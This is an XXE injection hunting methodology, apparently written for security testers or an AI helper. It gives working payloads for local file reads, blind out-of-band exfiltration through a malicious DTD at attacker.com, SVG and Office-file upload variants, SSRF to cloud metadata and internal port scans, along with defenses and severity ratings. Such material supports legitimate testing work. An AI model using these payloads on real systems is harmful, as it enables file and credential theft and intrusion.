# XXE — XML External Entity Injection Hunting Methodology

## What Is XXE

When an XML parser processes external entity references in user-supplied XML, an attacker can:
- Read local files from the server filesystem
- Perform SSRF via the parser
- In some cases achieve RCE (via Expect wrapper or out-of-band techniques)

---

## Finding XXE Entry Points

**Anywhere the application accepts XML input:**
- SOAP web services (`Content-Type: text/xml`)
- REST endpoints accepting `application/xml`
- File upload (`.xml`, `.svg`, `.docx`, `.xlsx`, `.pptx` — all contain XML)
- XML-based APIs (RSS feeds, Atom, sitemaps)
- `Content-Type: application/x-www-form-urlencoded` endpoints that switch to XML parsing when XML is detected

**Indicators the app parses XML:**
- Request/response has XML structure
- Errors mention "XML", "SAX", "DOM", "XSD", "DTD"
- SOAP envelope visible in Burp
- App accepts `.xml` file uploads

---

## Detection Payloads

**Step 1 — Inject a basic XXE (suggest to user):**

Replace the XML body with:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

If content of `/etc/passwd` appears in response → **Classic XXE confirmed.**

**Step 2 — If no reflection (Blind XXE via OOB):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR-ID.oast.pro/xxe"> %xxe;]>
<root><data>test</data></root>
```

If DNS/HTTP hit on collaborator → **Blind XXE confirmed.**

**Step 3 — Blind XXE file exfiltration via DTD:**
Host a malicious DTD at `http://attacker.com/evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

Then inject: `<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>`

---

## SVG / File Upload XXE

Many apps don't think of SVGs as XML:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="400px" height="400px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload as `.svg` to avatar, image, import features. If the server renders SVG and returns content → XXE via file upload.

**Office documents (DOCX/XLSX):**
- Unzip the DOCX
- Inject XXE into `word/document.xml` or `[Content_Types].xml`
- Re-zip and upload

---

## XXE → SSRF

XXE can be used to reach internal services (like SSRF via XML parser):
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://[cloud-imds-ip]/latest/meta-data/">]>
<root><data>&xxe;</data></root>
```

If the response contains AWS IMDS data → **XXE → SSRF → Cloud credential theft = Critical.**

---

## XXE SSRF Internal Port Scan (Blind)

Try internal addresses:
```xml
<!ENTITY xxe SYSTEM "http://localhost:6379/">   <!-- Redis -->
<!ENTITY xxe SYSTEM "http://localhost:27017/">  <!-- MongoDB -->
<!ENTITY xxe SYSTEM "http://localhost:8500/">   <!-- Consul -->
```

Observe response time differences (open vs closed port) for internal port scanning.

---

## Defenses That Block XXE

| Defense | Effect |
|---|---|
| `.disableExternalEntities()` in Java | Blocks external entity resolution |
| `libxml_disable_entity_loader(true)` in PHP | Blocks in older PHP |
| `FEATURE_EXTERNAL_GENERAL_ENTITIES = false` | Java SAX/DOM protection |
| `defusedxml` library in Python | Blocks all XXE |
| Whitelisting allowed XML structure | May not fully protect |

If the app uses these, XXE is blocked → discard.

---

## Impact Classification

| Finding | Severity |
|---|---|
| File read: `/etc/passwd` | Medium |
| File read: config/credentials/`.env` | High |
| File read: `/etc/shadow`, SSH keys | Critical |
| XXE → SSRF → cloud credentials | Critical |
| Blind XXE (OOB confirmed, no data exfil) | Medium |
| XXE in admin-only feature | Medium-High |

## Evidence Requirements
1. XML payload sent (full HTTP request)
2. File content returned in response (or OOB DNS/HTTP request received)
3. Exact XML feature/endpoint affected
4. If blind: collaborator log showing DNS/HTTP callback
